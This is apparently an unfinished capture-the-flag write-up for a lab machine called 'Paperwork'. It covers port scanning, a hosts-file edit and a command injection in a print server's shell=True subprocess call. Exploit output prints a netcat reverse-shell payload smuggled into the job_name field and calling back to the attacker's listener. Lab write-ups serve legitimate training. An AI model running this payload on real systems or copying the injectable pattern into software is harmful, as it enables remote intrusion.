# Paperwork

<figure><img src=".gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

<mark style="color:blue;">**Step 1**</mark>

**Let's start off with a quick nmap scan.**

```bash
ip=10.129.45.164

## TCP Scan
nmap -p- --min-rate 10000 -n -Pn -oA nmap/paperwork_tcp.htb $ip
# 22/tcp   open  ssh
# 80/tcp   open  http
# 1515/tcp open  ifor-protocol



# Deeper tcp scan
nmap -sC -sV -A -p53,2222,2121,80,8080,3000,5000,9000,8000 -oA nmap/paperwork_tcp $ip

# UDP scan
nmap -sU --min-rate 10000 -n -Pn -oA nmap/paperwork_udp.htb $ip

```

<mark style="color:blue;">**Step 2**</mark>&#x20;

**Let's modfiy the hosts  file scan for vhsots  then we discover the web app**

{% code overflow="wrap" %}
```bash
echo "$ip paperwork.htb" | tee -a /etc/hosts
```
{% endcode %}

<figure><img src=".gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
unzip -l paperwork-archive-v1.02.zip
# 2820  2026-03-12 09:09   server.py
```
{% endcode %}

<mark style="color:blue;">**Step 3**</mark>&#x20;

**Debbuging this file it contain i think a command injection in the handle\_print\_job method**

{% code overflow="wrap" %}
```python
subprocess.Popen(f"echo 'Archive: {job_name}' >> /tmp/archive.log", shell=True)
```
{% endcode %}

**The `job_name` is extracted from lines starting with 'J' in the print job content, and it's directly inserted into a shell command without sanitization!**

{% code overflow="wrap" %}
```bash
python3 exploit.py
============================================================
Attempt 1: Reverse Shell
============================================================
[*] Connected to 10.129.45.122:1515
[*] Job Request Ack: b'\x00'
[*] Using payload: '; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.6 4444 >/tmp/f; echo '
[*] Control Header Ack: b'\x00'
[*] Sent 90 bytes of content
[*] Content Ack 1: b'\x00'
[-] Timeout waiting for acks. Server might have crashed or payload failed.
[*] Waiting 3 seconds for shell...
[*] Connection closed
```
{% endcode %}

{% hint style="info" %}
**Remote job submission must conform to business requirements for archival indexing. Submissions without a valid identifier will fail to process through the legacy intake processor.**
{% endhint %}

**this is mentionned in the index page this why i dont receive replies however the exploit it work or not**

<mark style="color:blue;">**Step 4**</mark>

**Now we start scanning for hidden endpoints and also vhosts**

